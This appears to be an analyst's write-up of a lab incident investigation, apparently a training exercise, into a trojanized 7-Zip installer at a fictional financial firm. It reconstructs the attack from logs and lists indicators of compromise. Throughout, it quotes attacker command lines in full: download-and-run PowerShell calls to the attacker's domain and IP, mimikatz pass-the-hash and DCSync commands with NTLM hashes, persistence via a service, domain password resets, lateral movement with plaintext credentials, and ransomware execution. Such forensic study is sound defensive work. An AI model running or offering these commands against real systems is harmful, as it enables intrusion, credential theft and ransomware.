September 26, 2023 - 4:00 PM - ransomware via trojan malware.

- Persistence
- Extracted Credentials using Mimikatz which allowed lateral movement

### Objectives

- Investigate command-line artifacts and reconstruct process trees to reveal the attacker's steps.
- Correlate tool usage with MITRE ATT&CK techniques.
- Map compromised accounts over time.

## Indicator of Compromise Lists
---
From the initial investigation of the alert, the SOC team was able to collect the following:
#### Network Based:

Domain:

- 7zipp.org

IP address:

- 206.189.34.218

#### Host Based:

FileExtension:

- `*.777zzz` (Most likely ransomware extension)
- `*.msi`
- `*.ps1`

FileNames:

- 7zipp.exe
- 7zipp.dll
- mimikatz.exe

Hashes:

- 4b9213d22989474b467aa53080d9e295
- 29efd64dd3c7fe1e2b022b7ad73a1ba5
- 61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1

# Analysis

Perry Parsons: perry.parsons WKSTN-03 - 172.16.1.152

```C
"perry.parsons" AND "7zipp.org"
```

Powershell execution downloading `bomb.exe`:

```PowerShell
-C Invoke-Command -ScriptBlock {iwr http://www.7zipp.org/a/777bomb.exe -outfile C:\Users\perry.parsons\bomb.exe; ; dir C:\Users\perry.parsons} -ComputerName WKSTN-03.swiftspendfinancial.thm
```

**1. Initial Access:**

7zipp[.]org downloads a `.msi` file:

```C
http://www.7zipp.org/a/7z2301-x64.msi
```

processPid: 2,740 | 2036 (probably this one)
FileHash256: 7e8388aaed184a3fffce81afdbf3831ad1f144a5ca343cfcf85605a0ebf6da47
eventType: File Created
Time: Sep 26, 2023 @ 14:22:07.433

This most likely suggests this is the initial access path the attacker took.

```C
"perry.parsons" AND "*.msi"
```

Installation of the trojanized 7zip:

```C
C:\Windows\System32\msiexec.exe, /i, C:\Users\perry.parsons\Downloads\7z2301-x64.msi
```

ParentProcessID: 7008 | chrome.exe most likely launched by the user in chrome
ProcessId: 2532
Timestamp: Sep 26, 2023 @ 14:23:00.817
FileHash256: 	
5c130a69e77e549750c7af7d22c1ce646dcd20fd642bc0488c121dfe30f6a841

There will be **NO process tree** as the installation is handed off to NT AUTHORITY SYSTEM. This is proven by finding this string:

```C
Beginning a Windows Installer transaction: C:\Users\perry.parsons\Downloads\7z2301-x64.msi. Client Process Id: 2532.
```

**2. Exfiltration:**

After the installation of the `.msi` file it created a `Foobar 1.0` file and then the threat actor spawns a PowerShell and downloaded and executed `PowerExtract.ps1`then proceed to store the dump to `C:\windows\temp\trash.evtx`:

```C
-C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\windows\temp\trash.evtx;
```

- winlog.process.pid: 10,536
- Timestamp: Sep 26, 2023 @ 14:26:13.720	

There are no hashes extracted but user's exposed these are: 'perry.parsons', 'Administrator', and 'cmnatic' but no NThash found as it is empty but on other events we can see this line using the same filter:

```C
Username=james.cromwell; NTHash / Password=B852A0B8BD4E00564128E0A5EA2BC4CF; LogonDomain=; Type=MSV}, @{Username=WKSTN-03$; NTHash / Password=E6A55FED2E27F712E8050E2DAE7A153C; LogonDomain=; Type=MSV}, @{Username===perry.parsons==; NTHash / Password=F49E13C828190059E9EF31D7729CE568; LogonDomain=; Type=MSV}
```

**3. Impact:**

Then later on the same workstation and different row event, I found this:

```C
"perry.parsons" AND "Get-ChildItem"
```

Output in one of the rows:

```C
CommandInvocation(Get-ChildItem): "Get-ChildItem" ParameterBinding(Get-ChildItem): name="Path"; value="C:\Users\perry.parsons" CommandInvocation(Out-Default): "Out-Default" ParameterBinding(Out-Default): name="Transcript"; value="True" ParameterBinding(Out-Default): name="InputObject"; value="3D Objects" ParameterBinding(Out-Default): name="InputObject"; value="Contacts" ParameterBinding(Out-Default): name="InputObject"; value="Desktop" ParameterBinding(Out-Default): name="InputObject"; value="Documents" ParameterBinding(Out-Default): name="InputObject"; value="Downloads" ParameterBinding(Out-Default): name="InputObject"; value="Favorites" ParameterBinding(Out-Default): name="InputObject"; value="Links" ParameterBinding(Out-Default): name="InputObject"; value="Music" ParameterBinding(Out-Default): name="InputObject"; value="Pictures" ParameterBinding(Out-Default): name="InputObject"; value="Saved Games" ParameterBinding(Out-Default): name="InputObject"; value="Searches" ParameterBinding(Out-Default): name="InputObject"; value="Videos"
```

- Timestamp: Sep 26, 2023 @ 15:39:49.884	
- source.user.domain: dmaian hall
- Executable PowerShell

Essentially, the command listed the contents of the user profile directory `C:\Users\perry.parsons` and that output was sent to the console (and being recorded to a transcript) and the logged on user is **damian.hall** which is the administrator. Looking at the Host Application it is `wsmprovhost.exe` which is commonly used for remote management.

```C
Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding
```

Using this filter below:

```C
perry.parsons AND "7zipp.org"
```

The `bomb.exe` is downloaded from the same malicious domain using PowerShell's `Invoke-WebRequest`:

```C
iwr http://www.7zipp.org/a/777bomb.exe -outfile C:\Users\perry.parsons\bomb.exe; ; dir C:\Users\perry.parsons
```

- File Create
- Damian Hall
- Timestamp: Sep 26, 2023 @ 15:41:30.355

Then it was executed by the same user from previous:

```C
CommandLine: "C:\Users\perry.parsons\bomb.exe"
```

- Timestamp: 2023-09-26 15:41:51.778
- ProcessId: 8068
- ParentProcessId: 8964 
- ParentImage: C:\Windows\System32\wsmprovhost.exe
- SHA256: 4CFBF83098FB137B0E68DAD615586E3722BD970E3CDB7E59F98219570B678A4D

The threat actor changes directory and then executed `bomb.exe` at the current directory:

```C
cd C:\Users\perry.parsons\;.\bomb.exe;ls -rec -file
```

- Timestamp: Sep 26, 2023 @ 15:43:50.297	
- ProcessId: 7372
- HostApplication: C:\Windows\system32\wsmprovhost.exe -Embedding
- Source User: Damian Hall
- ParentProcessId: 10140

4. **Impact:**

The `bomb.exe` with a processID of 7372 started modifying files by appending `777zzz` as file extension indicating ransomware:

Anything on user `perry.parsons` home directory is appended with `.777zzz`.

```C
ProcessGuid: {f27ff40b-fc36-6512-7a06-000000004802} ProcessId: 7372 Image: C:\Users\==perry.parsons==\bomb.exe 
TargetFilename: C:\Users\==perry.parsons==\Downloads\7z2301-x64.msi.777zzz 
```

- Timestamp: 2023-09-26 15:43:50.529
- User: SSF\damian.hall
- Process Terminated at time: Sep 26, 2023 @ 15:43:50.562	


```C
process.parent.pid: 4188
```

ParentProcessId: 4220
winlog.process.thread.id
7,388

The `.msi` instllation then it proceeds to connect to Github's content delivery network at IP 185.199.109[.]133 using powershell.exe and downloaded and execute a `.ps1` version of PowerView:

```C
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Set-DomainUserPassword -Identity anna.jones -AccountPassword (ConvertTo-SecureString 'pwn3dpw!!!' -AsPlaintext -Force) -Domain swiftspendfinancial.thm -Verbose
```

----

process.parent.pid: 4188

**Execution:**

The threat actor downloaded and executed a `.ps1` script from the malicious domain:

Filter:

```C
"WKSTN-03" AND "7z.ps1" and event.code: 1
```

Output:

```C
powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)
```

- Timestamp: Sep 26, 2023 @ 14:23:02.935	
- agent.hostname: WKSTN-03
- process.parent.executable: C:\Windows\Installer\MSI542E.tmp 

C:\Windows\Installer\MSI542E.tmp: interestingly enough this most likely comes from the malicious `.msi` file installation:

```C
command_line: powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)
```

- parent.command_line: C:\Windows\Installer\MSI542E.tmp
- timestamp: Sep 26, 2023 @ 14:23:02.935

Filter:

```C
7zipp.dll and "http" and "WKSTN-03"
```


The threat actor spawn a PowerShell then downloaded and executed a legitimate `7zip` executable from actual `7-zip.org`:

```C
iwr https://www.7-zip.org/a/7z2301-x64.exe -outfile C:\Windows\Temp\7zlegit.exe;
C:\Windows\Temp\7zlegit.exe /S;
Start-Sleep 15;
```

Next block:

**Persistence:**

```C
iwr http://206.189.34.218/a/7zipp.exe -outfile 'C:\Program Files\7-zip\7zipp.exe';
sc.exe create 7zService binpath= "C:\Program Files\7-zip\7zipp.exe" start="auto" obj="LocalSystem";
sc.exe start 7zService;
```

The threat actor downloaded a trojan zip file and placed the malicious `7zipp.exe` to `Program Files` directory with the hopes of fooling the user and then proceed to create a service with a key name of `7zService` that will automatically start indicated with `start=auto` effectively establishing persistence mechanism.

Next block:

```C
iwr http://206.189.34.218/a/7zipp.dll -outfile 'C:\Program Files\7-zip\7zipp.dll';
rundll32 'C:\Program Files\7-zip\7zipp.dll',Start;
```

The threat actor downloaded a `7zipp.dll` and placed it at the same directory `Program Files` directory with the hopes of fooling the user. Common techniques for defense evasion.

- Timestamp: Sep 26, 2023 @ 14:23:03.989	
- host.hostname: WKSTN-03
- winlog.process.pid: 4248

**Analyzing execution of 7zipp.dll:**

Filter:

```C
"WKSTN-03" AND "rundll32.exe 'C:\Program Files\7-zip\7zipp.dll'"
```

Output:

```C
"C:\Windows\system32\rundll32.exe" "C:\Program Files\7-zip\7zipp.dll",Start
```

- ParentCommandLine: powershell.exe iex(iwr hxxp://www.7zipp.org/a/7z.ps1 -useb)
- ParentProcessId: 4248
- ProcessId: 3988
- Timestamp: Sep 26, 2023 @ 14:23:48.075	

Next event shows same details but different ProcessId:

- ProcessId: 4188
- `CommandLine: "C:\Windows\system32\rundll32.exe" "C:\Program Files\7-zip\7zipp.dll",Start`
- ParentProcessId: 3988
- ParentCommandLine: "C:\Windows\system32\rundll32.exe" "C:\Program Files\7-zip\7zipp.dll",Start
- Timestamp: Sep 26, 2023 @ 14:23:48.129

Filter:

```C
"WKSTN-03" AND "rundll32.exe 'C:\Program Files\7-zip\7zipp.dll'" and process.parent.pid: 4188
```

Output:

The threat actor downloaded `PowerSharpBinaries's Invoke-NanoDump.ps1` it is used to dump the memory of a target process and executed `Invoke-Nanodump`:

```C
-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -useb); Invoke-Nanodump;
```

Inside the `Invoke-Nanodump.ps1` is the `$base64binary` and can also be viewed here at github, most notably the source code focuses on dumping `lsass`:

```C
# Source code here: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs
```

- Timestamp: Sep 26, 2023 @ 14:24:22.319	
- ProcessId: 8356
- ParentUser: NT AUTHORITY\SYSTEM
- ParentProcessId: 4188
- ParentCommandLine: "C:\Windows\system32\rundll32.exe" "C:\Program Files\7-zip\7zipp.dll",Start
- ProcessId: 8356

The threat actor enumerated the system and user using:

```C
cmd.exe /c systeminfo
-C invoke-COmmand -scriptblock {whoami}
```

- Start time of enumeration timestamp: Sep 26, 2023 @ 14:24:58.110	
- ParentCommandLine: "C:\Windows\system32\rundll32.exe" "C:\Program Files\7-zip\7zipp.dll",Start
- agent.hostname: WKSTN-03

Interestingly enough the `Invoke-Nanodump` also created:

Filter:

```C
"WKSTN-03" AND "Invoke-Nanodump"
```

Output:

Per hash this is a legitimate `WerFault.exe` Windows binary and it says that the process with ID number of **8356** crashes (the `Invoke-Nanodump`) -- this indicates this tool failed.

```C
CommandLine: C:\Windows\system32\WerFault.exe -u -p 8356 -s 2768
```

- Timestamp: 2023-09-26 14:24:25.996
- ProcessId: 10752
- ParentProcessId: 8356
- SHA256: 1e61d6ff6ede8189d90f6f82443e48e10e3fd6bf51da9dbf20062cc44129ef5b

Filter:

```C
process.parent.pid: 4188
```

Output:

The threat actor downloaded `PowerExtract` and dump the memory info of the **lsass.exxe** process to `C:\windows\temp\trash.evtx` since last time we saw that the `Invoke-Nanodump.ps1` failed.

```C
-C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\windows\temp\trash.evtx;
```

- Timestamp: 2023-09-26 14:25:18.945
- ParentProcessId: 4188
- ProcessId: 10536

Filter:

```C
"WKSTN-03" and process.parent.pid:4188
```

The threat actor using cmd.exe enumerated the local group administrators:

```C
/c net localgroup administrators
```

- Timestamp: Sep 26, 2023 @ 14:26:06.748
- ParentProcessId: 4188

Using the same filter, we noticed that the threat actor downloaded and executed **Bloodhound** which is the best Active Directory Enumerator and **Mimikatz** that use to dump the hashes of user:

```C
-C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -useb); Invoke-Bloodhound -c all
```

```C
-C iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile m.zip
```

- **Note:** the `m.zip` is later extracted via `-C Expand-Archive m.zip` at time 2023-09-26 14:29:08.621 to effectively bypass defenses as Mimikatz is a well known red team tool.

```C
/c .\mimikatz.exe 'sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8BD4E00564128E0A5EA2BC4CF /run:powershell.exe' 'exit'
```

This runs the attack called "Pass-The-Hash" this tells mimikatz to treat this NTLM hash as the credential for user `james.cromwell` in domain `swiftspendfinancial.thm`", then spawns `powershell.exe` under that impersonated account.

```C
/c net users anna.jones pwn3dpw!!! /domain
```

This attempts to change the password of the user **anna.jones** to "pwn3dpw!!!" on this domain.

- Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe or cmd.exe
- Started from: Sep 26, 2023 @ 14:26:46.047 to Sep 26, 2023 @ 14:34:24.516
- All have the same parent process ID.

Same filter:

The threat actor then proceed to download PowerView.ps1 and set the domain user password of **anna.jones** o "pwn3dpw!!!" to this domain **swiftspendfinancial.thm** and retrieved the name of the Active Directory domain:

```C
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-Domain
```

Next:

```C
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Set-DomainUserPassword -Identity anna.jones -AccountPassword (ConvertTo-SecureString 'pwn3dpw!!!' -AsPlaintext -Force) -Domain swiftspendfinancial.thm -Verbose
```

- Timestamp: Sep 26, 2023 @ 14:31:52.072
- ParentProcessId: 4188
- Powershell: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe


**Lateral Movement:**

```C
-C $username='SSF\anna.jones'; $password='pwn3dpw!!!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $new_creds = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-Command -ScriptBlock {powershell iwr http://www.7zipp.org/a/7zipp.dll -outfile C:\Users\anna.jones\Downloads\7zip.dll; rundll32.exe C:\Users\anna.jones\Downloads\7zip.dll,Start} -ComputerName WKSTN-03 -Credential $new_creds
```

This is basically the same, the difference is basically run and download `7zip.dll` again to **WKSTN-03** but this time download it and place it at **anna.jones** and to prove who I am here is her password

```C
-C $username='SSF\anna.jones'; $password='pwn3dpw!!!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $new_creds = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-Command -ScriptBlock {powershell iwr http://www.7zipp.org/a/7zipp.dll -outfile C:\Users\anna.jones\Downloads\7zip.dll; rundll32.exe C:\Users\anna.jones\Downloads\7zip.dll,Start} -ComputerName WKSTN-02 -Credential $new_creds
```

Next:

```C
-C $username='SSF\anna.jones'; $password='pwn3dpw!!!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $new_creds = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-Command -ScriptBlock {whoami} -ComputerName WKSTN-02.swiftspendfinancial.thm -Credential $new_creds
```

This is basically the same, the difference is basically run and download `7zip.dll` again to **WKSTN-02** and  **WKSTN-02.swiftspendfinancial.thm** (Effectively jumping to another network) but this time download it and place it at **anna.jones** directory and to prove who I am here is her password.

- Timestamp: 2023-09-26 14:54:45.103
- ParentCommandLine: "C:\Windows\system32\rundll32.exe" "C:\Program Files\7-zip\7zipp.dll",Start
- ParentProcessId: 4188

Right after compromising `anna.jones` workstation, the threat actor lookedup the IP address of the compromised machine:

```C
/c nslookup WKSTN-02
/c nslookup WKSTN-02.swiftspendfinancial.thm
```

- Timestamp: Sep 26, 2023 @ 15:04:53.324
- ParentCommandLine: "C:\Windows\system32\rundll32.exe" "C:\Program Files\7-zip\7zipp.dll",Start

### James CromWell 
---
Previously, james.cromwell hash was used to execute powershell on the said domain:

```C
/c .\mimikatz.exe 'sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8BD4E00564128E0A5EA2BC4CF /run:powershell.exe' 'exit'
```

Here is how the threat actor managed to retrieve his hash:

Filter:

```C
"WKSTN-03" and "james.cromwell"  and "powershell"
```

Output:

The threat actor dumped the memory of **lsass** which happens to store credentials in memory:

```C
-C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\windows\temp\trash.evtx;
```

And viewing one of the events shows his hash:

```C
name="InputObject"; value="@{Username=james.cromwell; NTHash / Password=B852A0B8BD4E00564128E0A5EA2BC4CF; LogonDomain=; Type=MSV}, 
```

- host.hostname: WKSTN-03
- Timestamp: Sep 26, 2023 @ 14:26:13.928

### Damian Hall Exploitation
---
Filter:

```C
"anna.jones" AND "WKSTN-02" and ("iwr" or "iex") 
```

After successfuly compromising and moving laterally to **anna.jones**, the threat actor downloaded and executed 'PowerView.ps1' and enumeratd for Domain Admins:

Additionally the threat actor enumerated for users in the 'AD recovery' group:

```C
- C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroupMember -Identity 'AD Recovery' -Verbose
```

- Timestamp: Sep 26, 2023 @ 15:16:05.347

```C
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroupMember -Identity 'Domain Admins'
```

- Timestamp: Sep 26, 2023 @ 15:17:06.078
- user.name: anna.jones
- workstation: WKSTN-02.swiftspendfinancial.thm

```C
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroupMember -Identity 'Domain Administrators'
```

- Sep 26, 2023 @ 15:16:55.533

Using the same filter, the threat actor it runs a **DCSync** attack against domain controller to pull account credentials for `damian.hall` using **sharpkatz**:

```C
-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb); Invoke-Sharpkatz -Command --Command dcsync --Domain swiftspendfinancial.thm --DomainController DC-01.swiftspendfinancial.thm --User damian.hall 
```

- Timestamp: Sep 26, 2023 @ 15:17:19.525
- ProcessId: 7272
- ParentProcessId: 4220

Then the threat actor downloaded and executed **Sharphound.ps1** which is used to enumerate AD objects, relations, and ACLs to be used in bloodhound graphing:

```C
-C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -useb); Invoke-Bloodhound -c all
```

- Timestamp: Sep 26, 2023 @ 15:25:54.084
- ParentProcessId: 4220

Same goal **DCSync** attack again:

```C
-C .\mimikatz.exe 'lsadump::dcsync /user:damian.hall' 'exit'
```

- Timestamp: Sep 26, 2023 @ 15:35:51.175

The threat actor then in turn **uses the supplied NTLM hash** to authenticate as `damian.hall` (Pass‑the‑Hash) and spawns a new `powershell.exe` process running as that user:

```C
-C .\mimikatz.exe 'sekurlsa::pth /user:damian.hall /domain:swiftspendfinancial.thm /ntlm:eb1892cb0a163e122bc71be173c66fed /run:powershell.exe' 'exit'
```

- Timestamp: Sep 26, 2023 @ 15:34:42.247
- ProcessId: 7300
- ParentProcessId: 4220

Then the threat actor later executed `bomb.exe` again at **anna.jones** computer:

```C
-C Invoke-Command -ScriptBlock {cd C:\Users\anna.jones; iwr http://www.7zipp.org/a/777bomb.exe -outfile bomb.exe; pwd; .\bomb.exe; ls -rec -file } -ComputerName WKSTN-02.swiftspendfinancial.thm
```

- Timestamp: Sep 26, 2023 @ 15:45:12.166



